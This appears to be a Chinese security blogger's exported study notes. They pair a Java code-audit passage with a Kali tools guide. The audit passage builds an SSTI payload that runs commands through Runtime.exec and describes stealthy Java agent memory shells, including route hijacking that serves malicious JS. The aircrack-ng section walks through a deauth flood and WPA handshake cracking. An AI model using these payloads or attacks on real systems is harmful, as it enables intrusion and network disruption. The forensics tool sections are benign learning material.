abnf">上传漏洞下断点的位置<br>HttpServletRequest request <span class="hljs-operator">=</span> getRequest()<span class="hljs-comment">;有点Java知识的人都认识这个,所以第一个断点设置在这里。</span><br>第二个断点，审计的上传漏洞，肯定设置在上传方法里<br>比如： responsedata <span class="hljs-operator">=</span> fm.add()<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">先黑盒并抓包判断访问位置，然后白盒确定过滤和防护等并绕过<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ssti模板注入 如framwork 注意检查大部分国产模板<br></code></pre></td></tr></table></figure><p>简单写个payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(newInstance(),<span class="hljs-string">&quot;calc&quot;</span>)<br>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)的形式，然后payload就变成下面这样子了。<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)).invoke(newInstance(),<span class="hljs-string">&quot;calc&quot;</span>)<br>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>)最终payload就变成了下面这样子。<br>$&#123;<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)).invoke(<span class="hljs-meta">@java</span>.lang.Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>).invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc&quot;</span>)&#125;<br><br>遇到使用了模板的解析CMS可以根据模板解析语言尝试执行命令，若遇到函数警用的情况可以尝试一些Bypass方法，比例一些反射、反序列化、字节码修改等。SSTI注入难的其实如何构造Payload，构造好了之后一切自然而然了。<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">黑盒中f12网络的各个显示的链接 都可以点一下 长一点的链接优先，然后跟进白盒<br><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">前台随便审一下就行，主要是看下有没有权限，并记下记录，万一后面后台rce要用到<br>审的时候一个流程一个流程来 每个流程的小流程都写一下流程<br><br></code></pre></td></tr></table></figure><h2 id="内存码"><a href="#内存码" class="headerlink" title="内存码"></a>内存码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Agent内存码篇<br>    <br>由于实际环境中我们通常遇到的都是已经启动着的，所以 premain 那种方法不合适内存马注入，所以我们这里利用 agentmain 方法来尝试注入我们的内存马<br>    <br>由于某些中间件（例如nginx）只记录GET请求，使用POST方式发送数据会更加隐蔽。<br><br>由于在Filter层过滤了http请求，访问任意的路由都可以执行恶意代码，为了隐蔽性不建议使用不存在的路由。<br><br>agent可以注入多个，但是相同类名的transformer只能注入一个，所以要再次注入别的agent的时候记得更改一下类名。<br><br>这种内存马一旦注入到目标程序中，除了重启没有办法直接卸载掉，因为修改掉了原本的类的字节码。<br><br>既然如此，那我再把它改回去不就得了嘛。这就是我为什么选择doFilter方法的原因——逻辑简单，方便还原。它的逻辑只是调用了internalDoFilter()方法（简单来说）。还原就只需要setBody()即可：<br><br>拓展、<br>当我们能够改变类的字节码，那能做的事情可多了去了，下面我提出两个例子，抛砖引玉。<br><br><span class="hljs-number">1.</span>路由劫持<br>再来假设这么一个情况：拿下来了站点A，同时其他的资产暂时没有更大的收获，需要使用其他方法来扩展攻击面。在A的/login中使用了/<span class="hljs-keyword">static</span>/js/<span class="hljs-number">1.</span>js，那就可以劫持这个路由，回显给他恶意的js代码。<br>实现的话，只需要在start.txt也就是即将插入的代码块中，判断一下当前访问的路由。<br><span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><span class="hljs-keyword">if</span> (uri.equals(<span class="hljs-string">&quot;/static/js/1.js&quot;</span>)) &#123;<br>    response.getWriter().write([恶意js代码]);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br>那么当访问到/login的时候，浏览器发现引用了外部js——/<span class="hljs-keyword">static</span>/js/<span class="hljs-number">1.</span>js，就会去请求它，然而请求被我们修改后的ApplicationFilterChain#doFilter()拦截，返回了一个虚假的页面，导致资源被“替换”，恶意代码发挥作用。<br><br><span class="hljs-number">2.</span>替换shiro的key<br>    在解析rememberMe的时候，先将其base64解码，然后使用AES解密，在AES解密的时候，会调用org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()，更改掉这个函数的返回值，就可以更改解密的密钥。实现也很简单，只需要改掉上面的常量和start.txt即可：<br>    <br>    <br>还有就是之前看大哥们说过，在有的环境下agent内存马注入之后网站会崩掉，听他们说是有可能因为虚拟内存不够了而导致的，所以具体使用的话还是需要事先斟酌一下<br>还有就是关键类寻找不对等情况也有可能导致网站被打挂<br></code></pre></td></tr></table></figure><p>选中类按F4能够知道此类的长继承关系</p><h2 id="几个关于断点调试的小技巧"><a href="#几个关于断点调试的小技巧" class="headerlink" title="几个关于断点调试的小技巧"></a>几个关于断点调试的小技巧</h2><p>1.断点打上后右键断点:b:可以编辑 不如设置x&#x3D;50就能断点到x&#x3D;50之前所有的回显 不用自己手动一次一次放过</p><p>2.热重载 边断点调试边改代码</p><p>3.多线程往往执行都是无顺序的 因为是多线程 那么其中如果为了打断点只要回显一个线程的所有报文 应该打开调试-窗体-线程</p><p>就能看到所有线程，且每个线程会有对应的id 我们只需要右键断点编辑其中的筛选器设置“thread&#x3D;‘线程id’”</p>]]></content>
    
    
    <categories>
      
      <category>java 代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali全部软件介绍</title>
    <link href="/kali%E5%85%A8%E9%83%A8%E8%BD%AF%E4%BB%B6%E4%BB%8B%E7%BB%8D.html"/>
    <url>/kali%E5%85%A8%E9%83%A8%E8%BD%AF%E4%BB%B6%E4%BB%8B%E7%BB%8D.html</url>
    
    <content type="html"><![CDATA[<p>&#x3D;对于部分istat软件和img软件 需要了解inode是什么&#x3D;&#x3D;</p><p>&#x3D;&#x3D;详情见我的另一篇文章 《shell编程学习》2.2中的内容&#x3D;&#x3D;</p><h1 id="x3D-x3D-A-x3D-x3D"><a href="#x3D-x3D-A-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;A&#x3D;&#x3D;"></a>&#x3D;&#x3D;A&#x3D;&#x3D;</h1><h2 id="arping-没写完"><a href="#arping-没写完" class="headerlink" title="arping(没写完)"></a>arping(没写完)</h2><p>arping命令是用于发送arp请求到相邻主机的工具，arping使用arp数据包<br>arping有两个版本，一个版本是<em><strong>Thomas Habets</strong></em>这个人写的，这个版本有个好处是可以arping &lt;MAC地址&gt;，也就是说我们可以通过MAC地址得到IP。</p><p>而我们kali上的arping就是这个版本的</p><p>语法</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">Usage: arping <span class="hljs-comment">[-fqbDUAV]</span> <span class="hljs-comment">[-c count]</span> <span class="hljs-comment">[-w timeout]</span> <span class="hljs-comment">[-I device]</span> <span class="hljs-comment">[-s source]</span> destination<br></code></pre></td></tr></table></figure><p>-A：与-U参数类似，但是使用的是ARP REPLY包而非ARP REQUEST包。<br>-b：发送以太网广播帧，arping在开始时使用广播地址，在收到回复后使用unicast单播地址。<br>-c：发送指定的count个ARP REQUEST包后停止。如果指定了-w参数，则会等待相同数量的ARP REPLY包，直到超时为止。<br>-D：重复地址探测模式，即，Duplicate address detection mode (DAD)，用来检测有没有IP地址冲突，如果没有IP冲突则返回0。<br>-f：收到第一个响应包后退出。<br>-h：显示帮助页。<br>-I：用来发送ARP REQUEST包的网络设备的名称。<br>-q：quite模式，不显示输出。<br>-U：无理由的（强制的）ARP模式去更新别的主机上的ARP CACHE列表中的本机的信息，不需要响应。<br>-V：显示arping的版本号。<br>-w：指定一个超时时间，单位为秒，arping在到达指定时间后退出，无论期间发送或接收了多少包。在这种情况下，arping在发送完指定的count（-c）个包后并不会停止，而是等待到超时或发送的count个包都进行了回应后才会退出。<br>-s：设置发送ARP包的IP资源地址，如果为空，则按如下方式处理：<br>  1、DAD模式（-D）设置为0.0.0.0；<br>  2、Unsolicited模式（-U）设置为目标地址；<br>  3、其它方式，从路由表计算。</p><p>实例</p><p>1、查看某个IP的MAC地址</p><p>有多个网卡可以用 -I 指定网卡接口</p><h2 id="Atril文档查看器"><a href="#Atril文档查看器" class="headerlink" title="Atril文档查看器"></a>Atril文档查看器</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406215134443.png" alt="image-20220406215134443"></p><p>就这样、常用于看pdf文件</p><p>左边目录右边数据</p><p>还挺好用的</p><h2 id="autopsy"><a href="#autopsy" class="headerlink" title="autopsy"></a>autopsy</h2><p>它是首屈一指的端到端开源数字取证平台。 由Basis Technology构建，具有您在商业取证工具中所期望的核心功能，Autopsy是一种快速，全面，高效的硬盘调查解决方案，可根据您的需求而发展。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406215354267.png" alt="image-20220406215354267"></p><p>打开生成的链接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406215520154.png" alt="image-20220406215520154"></p><p>新建一个newcase</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD%5Cimage-20220406215942391.png" alt="image-20220406215942391"></p><p>填好必要信息之后点击new case</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220018642.png" alt="image-20220406220018642"></p><p>点击add host</p><p>按照默认的设置继续点击add host</p><p>在下图中点击add image加载将要分析的镜像</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220213069.png" alt="image-20220406220213069"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220225040.png" alt="image-20220406220225040"></p><p>选择校验hash值的选项，然后add</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220245203.png" alt="image-20220406220245203"></p><p>autopsy会计算文件的hash，点击ok即可</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220334017.png" alt="image-20220406220334017"></p><p>回来到如下界面</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220410126.png" alt="image-20220406220410126"></p><p>点击右侧的details可以查看镜像名称、volume ID、文件格式等细节</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220446728.png" alt="image-20220406220446728"></p><p>点击浏览器的返回按钮就可以返回先前的界面继续分析<br>在分析之前我们可以通过MD5 hash校验镜像的完整性，点击image integrity即可</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220638074.png" alt="image-20220406220638074"></p><p>点击validate按钮来验证</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220653642.png" alt="image-20220406220653642"></p><p>在左下角可以看到验证通过，点击close继续分析</p><p>主界面中点击analyse进行分析</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220736879.png" alt="image-20220406220736879"></p><p>之后进入到如下界面</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220906070.png" alt="image-20220406220906070"></p><p>点击上面的image details菜单</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406220919741.png" alt="image-20220406220919741"></p><p>可以看到版本等详细信息，接下来点击file analysis</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406221332024.png" alt="image-20220406221332024"></p><p>进入了文件浏览模式，可以查看镜像中的文件夹和文件，在主视区域可以可以看到项目的权限、大小、metadata等</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406221619976.png" alt="image-20220406221619976"></p><p>在界面的左侧有四个主要的功能</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406221635585.png" alt="image-20220406221635585"></p><p>点击expand direcroty，所有的内容都可以很容易被查看</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406221704936.png" alt="image-20220406221704936"></p><p>点击前面的“+“，则在右侧的主视图的区域还有显示子目录<br>要查看删除的文件，可以点击all deleted files按钮</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406221857396.png" alt="image-20220406221857396"></p><p>删除的文件在主视图区域被用红色字体标记<br>拉到最右边，点击meta下的链接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222038970.png" alt="image-20220406222038970"></p><p>可以看到详细的信息。包括16进制的数据以及扩展名等<br>比如我们从图中可以看到原来的扩展名很奇怪，hmm</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222118499.png" alt="image-20220406222118499"></p><p>我们点击蓝色字体的1066</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222136300.png" alt="image-20220406222136300"></p><p>可以看到JPEG文件格式的特征。这意味着file7.hmm可能是一个jpeg文件，只不过扩展名被修改了</p><p>查看每个文件的元数据metadata并不现实，此时可以用到file type的功能<br>点击上面的file type一栏即可</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222327304.png" alt="image-20220406222327304"></p><p>点击左侧的sort files by type,以及右侧的ok</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222342322.png" alt="image-20220406222342322"></p><p>排序结束之后，归纳的结果就出来了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222420206.png" alt="image-20220406222420206"></p><p>比如在上图中可以看到有5个扩展不匹配</p><p>接下来我们可以点击左侧的view sorted files查看排序后的文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222530068.png" alt="image-20220406222530068"></p><p>给出了输出文件夹的路径<br>按照相应路径打开即可</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222604401.png" alt="image-20220406222604401"></p><p>使用firefox打开index.html</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222620343.png" alt="image-20220406222620343"></p><p>扩展名不匹配的文件如下图所示</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222654452.png" alt="image-20220406222654452"></p><p>这五个文件可以进一步通过查看元数据进行分析，和上面的步骤是一样的<br>可能有时候某些意外暂停了这次的分析，下次启动时只需要点击open case</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222721755.png" alt="image-20220406222721755"></p><p>选中需要分析的case，点击ok就可以继续分析了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406222756035.png" alt="image-20220406222756035"></p><p>windows版本使用方法:<a href="https://www.wangan.com/docs/1658">https://www.wangan.com/docs/1658</a></p><h2 id="aircrack-ng-wifi"><a href="#aircrack-ng-wifi" class="headerlink" title="aircrack-ng wifi"></a>aircrack-ng wifi</h2><p>(最好在实体kali机中使用)</p><p>ifconfig查看你的网卡信息，wlan0即无线网卡</p><p>airmon-ng start wlan0(启动网卡监听模式)</p><p> 启动后ifconfig查看一下，如果网卡名变成了wlan0mon了，则表示操作成功。</p><p>扫描附近wifi</p><p><strong>airodump-ng wlan0mon</strong></p><p>参数详解:</p><p>BSSID: MAC地址</p><p>PWR:信号强度，越小信号越强。</p><p>#Data:传输的数据, 数据越大对我们越有利, 大的夸张的可能在看电影</p><p>CH:信号频道</p><p>ESSID:wifi名称</p><h5 id="抓包开始"><a href="#抓包开始" class="headerlink" title="抓包开始"></a>抓包开始</h5><p>然后输入命令:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">airodump</span>-ng -c <span class="hljs-number">11</span> --bssid <span class="hljs-number">2</span>E:E9:D3:<span class="hljs-number">28</span>:<span class="hljs-number">59</span>:EB -w ``/home/chenglee/<span class="hljs-number">2018</span>/` `wlan0mon<br></code></pre></td></tr></table></figure><p>  解析:</p><p>-c代表频道, 后面带的是频道</p><p>bssid: mac地址(物理地址)</p><p>-w代表目录(抓到的握手包放在这个目录下面)</p><p>wlan0mon: 网卡名称</p><p>一直跑吖跑, 它的数据是不停刷新变化的…</p><p>这时候应该做点什么了,利用deauth洪水攻击，取消目标路由和所有设备的无线连接，这时候设备重新连接时，会抓取他的握手包，然后用字典进行爆破.</p><p>新开一个窗口观察</p><p>下面是进行抓包然后破解出该密码</p><p><strong>aireplay-ng -0 0 -a 2E:E9:D3:28:59:EB wlan0mon</strong></p><p><strong>这时候目标路由已经断网，如果抓到包记得ctrl+c关掉这里，否则一直断网就成恶作剧了。这时返回你抓包的那个窗口，如果右上角出现handshake这样的信息(看下图)，这说明抓包已经成功。</strong></p><p>8.破解</p><p>输入：<code>aircrack-ng -w ``/home/chenglee/dictionary/wpa``.txt ``/home/chenglee/2018/-01``.cap</code></p><p>解析:</p><p>-w后面接的是字典</p><p>-01.cap是握手包</p><p>也许过程会有点长, 这个得看密码复杂的与字典的好坏。</p><h2 id="arpspof"><a href="#arpspof" class="headerlink" title="arpspof"></a>arpspof</h2><p><a href="https://x.hacking8.com/post-108.html">https://x.hacking8.com/post-108.html</a></p><h1 id="B"><a href="#B" class="headerlink" title="B"></a>B</h1><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><h3 id="1-固件分析扫描"><a href="#1-固件分析扫描" class="headerlink" title="1.固件分析扫描"></a>1.固件分析扫描</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406223445373.png" alt="image-20220406223445373"></p><h3 id="2-提取文件系统"><a href="#2-提取文件系统" class="headerlink" title="2.提取文件系统"></a>2.提取文件系统</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406223558481.png" alt="image-20220406223558481"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 使用默认的预定义配置文件extract.conf</span><br>$ <span class="hljs-keyword">binwalk </span>-e firmware.<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span> <br><span class="hljs-comment"># 使用指定自定义的配置文件my_extract.conf</span><br>$ <span class="hljs-keyword">binwalk </span>--<span class="hljs-keyword">extract=./my_extract.conf </span>firmware.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><h3 id="3-设置过滤选项"><a href="#3-设置过滤选项" class="headerlink" title="3.设置过滤选项"></a>3.设置过滤选项</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224203956.png" alt="image-20220406224203956"></p><h3 id="4-显示完整的扫描结果"><a href="#4-显示完整的扫描结果" class="headerlink" title="4.显示完整的扫描结果"></a>4.显示完整的扫描结果</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224237155.png" alt="image-20220406224237155"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224301181.png" alt="image-20220406224301181"></p><h3 id="5-固件文件的比较"><a href="#5-固件文件的比较" class="headerlink" title="5.固件文件的比较"></a>5.固件文件的比较</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224535012.png" alt="image-20220406224535012"></p><h3 id="6-日志记录"><a href="#6-日志记录" class="headerlink" title="6.日志记录"></a>6.日志记录</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224829968.png" alt="image-20220406224829968"></p><h3 id="7-指令系统分析"><a href="#7-指令系统分析" class="headerlink" title="7.指令系统分析"></a>7.指令系统分析</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406224903442.png" alt="image-20220406224903442"></p><h3 id="8-熵分析"><a href="#8-熵分析" class="headerlink" title="8.熵分析"></a>8.熵分析</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406225013776.png" alt="image-20220406225013776"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD%5Cimage-20220406225057586.png"></p><h3 id="9-启发式分析"><a href="#9-启发式分析" class="headerlink" title="9.启发式分析"></a>9.启发式分析</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406225133301.png" alt="image-20220406225133301"></p><h3 id="10-手动提取文件"><a href="#10-手动提取文件" class="headerlink" title="10.手动提取文件"></a>10.手动提取文件</h3><p>-D, –dd&#x3D;&lt;type[:ext[:cmd]]&gt;</p><p>Extracts files identified during a –signature scan. Multiple –dd options may be specified.</p><ul><li><strong>type</strong> is a <em>lower case</em> string contained in the signature description (regular expressions are supported)</li><li><strong>ext</strong> is the file extension to use when saving the data disk (default none)</li><li><strong>cmd</strong> is an optional command to execute after the data has been saved to disk</li></ul><p>By default, the file name is the hexadecimal offset where the signature was found, unless an alternate file name is specified in the signature itself.</p><p>The following example demonstrates specifying an extraction rule using the –dd option that will extract any signature that contains the string ‘zip archive’ with a file extension of ‘zip’, and subsequently execute the ‘unzip’ command. Additionally, PNG images are extracted as-is with a ‘png’ file extension.</p><p>Note the use of the ‘%e’ placeholder. This placeholder will be replaced with the relative path to the extracted file when the unzip command is executed:</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406225252790.png" alt="image-20220406225252790"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406225626062.png" alt="image-20220406225626062"></p><p>其他附加操作详见<a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">https://blog.csdn.net/wxh0000mm/article/details/85683661</a></p><h2 id="blkcalc"><a href="#blkcalc" class="headerlink" title="blkcalc"></a>blkcalc</h2><h3 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h3><p>在未分配的磁盘单元编号和常规磁盘单元编号之间进行转换。<br>  blkcalc在两个映像之间创建磁盘单元号映射，一个映像与另一个映像仅包含第一个映像的未分配单元（blkls（1）程序的默认行为）.- d，-s或-u选项之一 如果给定了-d选项，则unit_addr值是常规映像（即从dd开始）中的磁盘单元地址。 如果未分配单元，则会在未分配的映像中给出其地址。 如果给出-u选项，则unit_addr值是未分配单元映像中的磁盘单元地址（即来自blkls（1）），并确定其在原始映像中的磁盘单元地址。 如果指定了-s选项，则unit_addr值是备用映像中的磁盘单元地址（即来自blkls -s的地址）。 该图片是完整的原始图片（即来自dd的图片）。 在3.0.0之前的TSK版本中，blkcalc被称为dcalc。<br>  要读取的磁盘或分区映像，其格式用“-i”指定。 如果图像被分割成多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个文件（例如，以’.001’结尾的文件），则会自动包含后续的图像段。 当关键字搜索由blkls生成的图像时，此功能很有用。 这样一来，您可以识别原始单元地址并提供更好的文档。</p><h3 id="选项："><a href="#选项：" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-f fstype </span><br>标识映像的文件系统类型。使用&#x27;-f 列表&#x27;列出支持的文件系统类型。如果没有给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-i imgtype</span><br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-o imgoffset</span><br>在映像中文件系统开始的扇区偏移量。<br><br><span class="hljs-deletion">-b dev_sector_size</span><br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br><span class="hljs-deletion">-v</span><br>详细输出到标准代码。<br><br><span class="hljs-deletion">-V</span><br>显示版本信息<br><br></code></pre></td></tr></table></figure><h2 id="blkcat"><a href="#blkcat" class="headerlink" title="blkcat"></a>blkcat</h2><h3 id="描述：-1"><a href="#描述：-1" class="headerlink" title="描述："></a>描述：</h3><p>针对image(磁盘映像)或者图像</p><p>blkcat-在磁盘映像中显示文件系统数据单元的内容。</p><p>blkcat从图像到标准输出的单位地址unit_addr以不同格式显示num数据单位（默认为1）（默认为原始）。在3.0.0之前的TSK版本中，blkcat被称为dcat。</p><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-a</span><br><br>以ASCII格式显示内容<br><br><span class="hljs-deletion">-f fstype</span><br><br>将图像指定为特定文件类型。如果在此处提供&#x27;swap&#x27;，则图像将以4096字节的大小显示。如果提供&#x27;raw&#x27;，则使用512字节作为默认大小.&#x27;- u &#x27;标志可以更改默认大小。使用&#x27;-f list&#x27;列出支持的文件系统类型。如果未给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-h</span><br><br>以16进制显示内容<br><br><span 